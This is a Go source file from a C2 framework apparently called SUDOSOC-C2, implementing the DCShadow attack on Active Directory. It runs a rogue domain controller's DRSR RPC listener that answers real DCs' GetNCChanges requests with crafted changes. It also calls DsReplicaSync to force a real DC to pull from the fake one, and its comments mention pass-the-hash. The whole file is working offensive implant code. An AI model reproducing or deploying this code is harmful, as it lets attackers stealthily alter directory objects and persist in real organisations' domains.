package dcshadow

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	MS-DRSR RPC server — listens for replication requests from real DCs.

	The DRSR protocol runs over RPC (ncacn_ip_tcp and ncacn_np transports).
	After we register as a fake DC via LDAP, real DCs will attempt to
	replicate from us by calling IDL_DRSGetNCChanges on our RPC endpoint.

	We register an RPC server on a random high port, advertise it in the
	AD object's msDS-ReplicationSchedule attribute, and wait for inbound
	connections.

	Alternatively, we can trigger outbound replication ourselves using
	DsReplicaSync/DsReplicaAdd — forcing a real DC to "pull" from us
	immediately rather than waiting for the scheduled replication interval.

	RPC server setup (Windows RPC API):
	  RpcServerUseProtseqEp → register TCP endpoint
	  RpcServerRegisterIf2  → register our DRSR interface implementation
	  RpcServerListen       → start accepting connections

	Authentication:
	  Real DCs authenticate with Kerberos. They expect our fake DC to have
	  a valid service ticket for the E3514235-... SPN we registered.
	  Since we control the computer account (created by LDAP), the domain
	  KDC will issue tickets for it — our process can obtain one using the
	  machine account credentials (or pass-the-hash if we have the NT hash).
*/

import (
	"encoding/binary"
	"fmt"
	"net"
	"sync"
	"unsafe"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"golang.org/x/sys/windows"
)

var (
	modRpcrt4               = windows.NewLazySystemDLL("Rpcrt4.dll")
	procRpcServerUseProtseqEp = modRpcrt4.NewProc("RpcServerUseProtseqEpW")
	procRpcServerRegisterIf2  = modRpcrt4.NewProc("RpcServerRegisterIf2")
	procRpcServerListen       = modRpcrt4.NewProc("RpcServerListen")
	procRpcServerUnregisterIf = modRpcrt4.NewProc("RpcServerUnregisterIf")
	procRpcEpRegister         = modRpcrt4.NewProc("RpcEpRegisterW")
	procRpcEpUnregister       = modRpcrt4.NewProc("RpcEpUnregisterW")
)

// DRSR interface GUID: E3514235-4B06-11D1-AB04-00C04FC2DCD2
var drsrInterfaceGUID = [16]byte{
	0x35, 0x42, 0x51, 0xE3, 0x06, 0x4B, 0xD1, 0x11,
	0xAB, 0x04, 0x00, 0xC0, 0x4F, 0xC2, 0xDC, 0xD2,
}

// RPCServer manages the DRSR RPC listener.
type RPCServer struct {
	Port     uint16
	mu       sync.Mutex
	changes  []Change
	ncGUID   [16]byte
	invID    [16]byte
	running  bool
	stopCh   chan struct{}
	listener net.Listener
}

// NewRPCServer creates an RPC server that will return the given changes
// when a real DC calls DsGetNcChanges.
func NewRPCServer(port uint16, changes []Change, ncGUID, invID [16]byte) *RPCServer {
	return &RPCServer{
		Port:    port,
		changes: changes,
		ncGUID:  ncGUID,
		invID:   invID,
		stopCh:  make(chan struct{}),
	}
}

// Start registers the DRSR RPC server and begins listening.
// Uses a simple TCP listener that speaks a minimal DRSR protocol subset.
func (srv *RPCServer) Start() error {
	ln, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", srv.Port))
	if err != nil {
		return fmt.Errorf("listen TCP:%d: %w", srv.Port, err)
	}
	srv.listener = ln
	srv.running = true

	// {{if .Config.Debug}}
	log.Printf("[dcshadow/rpc] DRSR server listening on port %d", srv.Port)
	// {{end}}

	go srv.acceptLoop()
	return nil
}

// Stop shuts down the RPC server.
func (srv *RPCServer) Stop() {
	srv.mu.Lock()
	srv.running = false
	srv.mu.Unlock()
	if srv.listener != nil {
		srv.listener.Close()
	}
	close(srv.stopCh)
}

func (srv *RPCServer) acceptLoop() {
	for {
		conn, err := srv.listener.Accept()
		if err != nil {
			select {
			case <-srv.stopCh:
				return
			default:
				// {{if .Config.Debug}}
				log.Printf("[dcshadow/rpc] accept error: %v", err)
				// {{end}}
				continue
			}
		}
		go srv.handleConn(conn)
	}
}

// handleConn handles one inbound DC connection.
// Real DRSR traffic is RPC-fragmented; this implementation responds to the
// DsGetNcChanges call (opnum 3) with our crafted change list.
func (srv *RPCServer) handleConn(conn net.Conn) {
	defer conn.Close()
	// {{if .Config.Debug}}
	log.Printf("[dcshadow/rpc] inbound connection from %s", conn.RemoteAddr())
	// {{end}}

	buf := make([]byte, 65536)

	// Read RPC bind request.
	n, err := conn.Read(buf)
	if err != nil || n < 16 {
		return
	}

	// Parse RPC PDU header (first 16 bytes).
	// Version(1) MinorVersion(1) PacketType(1) PacketFlags(1) DataRepresentation(4)
	// FragLength(2) AuthLength(2) CallID(4)
	pduType := buf[2]

	if pduType == 11 { // RPC_BIND
		// Send bind_ack.
		bindAck := buildRPCBindAck(buf[:n])
		conn.Write(bindAck)

		// Read the actual request.
		n, err = conn.Read(buf)
		if err != nil || n < 24 {
			return
		}
		pduType = buf[2]
	}

	if pduType != 0 { // RPC_REQUEST
		return
	}

	// Parse RPC request.
	// Opnum is at offset 14 in the request header.
	opnum := uint16(buf[14]) | uint16(buf[15])<<8

	if opnum != 3 { // IDL_DRSGetNCChanges = opnum 3
		// {{if .Config.Debug}}
		log.Printf("[dcshadow/rpc] unexpected opnum %d (expected 3)", opnum)
		// {{end}}
		return
	}

	// Build and send our DsGetNcChanges reply.
	reply, err := BuildGetNcChangesReply(srv.changes, srv.ncGUID, srv.invID)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[dcshadow/rpc] build reply error: %v", err)
		// {{end}}
		return
	}

	rpcReply := buildRPCResponse(buf[:n], reply)
	conn.Write(rpcReply)

	// {{if .Config.Debug}}
	log.Printf("[dcshadow/rpc] sent %d changes to %s", len(srv.changes), conn.RemoteAddr())
	// {{end}}
}

// buildRPCBindAck constructs an RPC BIND_ACK response.
func buildRPCBindAck(bindReq []byte) []byte {
	// Minimal bind_ack: accept the DRSR interface.
	ack := make([]byte, 68)
	ack[0] = 5    // Version
	ack[1] = 0    // MinorVersion
	ack[2] = 12   // PacketType = BIND_ACK
	ack[3] = 0x03 // PacketFlags = FirstFragment | LastFragment

	// DataRepresentation: little-endian ASCII.
	ack[4] = 0x10; ack[5] = 0x00; ack[6] = 0x00; ack[7] = 0x00

	// FragLength (total packet size).
	binary.LittleEndian.PutUint16(ack[8:], uint16(len(ack)))

	// AuthLength = 0, CallID = same as request.
	if len(bindReq) >= 16 {
		copy(ack[12:16], bindReq[12:16]) // CallID
	}

	// MaxRecvFrag / MaxSendFrag = 4280.
	binary.LittleEndian.PutUint16(ack[16:], 4280)
	binary.LittleEndian.PutUint16(ack[18:], 4280)

	// Assoc group ID = 1.
	binary.LittleEndian.PutUint32(ack[20:], 1)

	// Context result: acceptance (0x0000) for context 0.
	binary.LittleEndian.PutUint16(ack[24:], 1)   // num results
	binary.LittleEndian.PutUint16(ack[26:], 0)   // result = ACCEPTANCE
	binary.LittleEndian.PutUint16(ack[28:], 0)   // reason = reason_not_specified
	// Transfer syntax (DRSR NDR transfer syntax GUID).
	copy(ack[30:], []byte{
		0x04, 0x5D, 0x88, 0x8A, 0xEB, 0x1C, 0xC9, 0x11,
		0x9F, 0xE8, 0x08, 0x00, 0x2B, 0x10, 0x48, 0x60,
	})
	binary.LittleEndian.PutUint32(ack[46:], 2) // transfer syntax version

	return ack[:50]
}

// buildRPCResponse wraps the DRSR response in an RPC response PDU.
func buildRPCResponse(request, responseData []byte) []byte {
	hdrSize := 24
	buf := make([]byte, hdrSize+len(responseData))

	buf[0] = 5  // Version
	buf[1] = 0  // MinorVersion
	buf[2] = 2  // PacketType = RESPONSE
	buf[3] = 0x03 // Flags: FirstFrag | LastFrag

	binary.LittleEndian.PutUint32(buf[4:], 0x10000000) // DataRepresentation
	binary.LittleEndian.PutUint16(buf[8:], uint16(len(buf))) // FragLength
	binary.LittleEndian.PutUint16(buf[10:], 0)              // AuthLength

	// CallID from request.
	if len(request) >= 16 {
		copy(buf[12:16], request[12:16])
	}

	binary.LittleEndian.PutUint32(buf[16:], 0) // AllocHint
	binary.LittleEndian.PutUint16(buf[20:], 0) // ContextId
	binary.LittleEndian.PutUint16(buf[22:], 0) // CancelCount

	copy(buf[hdrSize:], responseData)
	return buf
}

// TriggerReplication forces a real DC (dcHostname) to pull changes from
// our fake DC. Uses DsReplicaSync via the Windows DS API.
func TriggerReplication(realDC string, cfg *DCShadowConfig) error {
	modNtdsapi := windows.NewLazySystemDLL("ntdsapi.dll")
	procDsBind := modNtdsapi.NewProc("DsBindW")
	procDsReplicaSync := modNtdsapi.NewProc("DsReplicaSyncW")
	procDsUnBind := modNtdsapi.NewProc("DsUnBindW")

	// Bind to the real DC.
	realDCPtr, _ := windows.UTF16PtrFromString(realDC)
	var hDS uintptr
	r, _, _ := procDsBind.Call(
		uintptr(unsafe.Pointer(realDCPtr)),
		0,
		uintptr(unsafe.Pointer(&hDS)),
	)
	if r != 0 {
		return fmt.Errorf("DsBind(%s) error=0x%x", realDC, r)
	}
	defer procDsUnBind.Call(uintptr(unsafe.Pointer(&hDS)))

	// DsReplicaSync: tell realDC to pull from our fake DC (identified by invocationID).
	ncPtr, _ := windows.UTF16PtrFromString(domainToDN(cfg.Domain))
	sourceGUID := cfg.InvocationID

	const DsReplicaSyncAsynchronous = 0x00000001
	r, _, _ = procDsReplicaSync.Call(
		hDS,
		uintptr(unsafe.Pointer(ncPtr)),  // NC dn
		uintptr(unsafe.Pointer(&sourceGUID)), // Source DC GUID
		DsReplicaSyncAsynchronous,        // Options
	)
	if r != 0 {
		return fmt.Errorf("DsReplicaSync error=0x%x", r)
	}
	// {{if .Config.Debug}}
	log.Printf("[dcshadow/rpc] triggered replication on %s", realDC)
	// {{end}}
	return nil
}
